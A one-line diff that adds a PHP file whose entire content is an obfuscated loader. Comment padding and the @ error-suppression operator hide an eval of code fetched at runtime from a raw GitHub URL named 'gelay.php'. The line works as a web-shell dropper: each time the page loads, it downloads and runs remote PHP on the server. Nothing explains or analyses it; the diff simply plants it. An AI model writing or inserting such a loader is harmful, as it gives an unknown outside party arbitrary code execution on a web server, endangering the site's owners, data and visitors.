@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/dono-zz/1945/main/gelay.php"));/**/?>
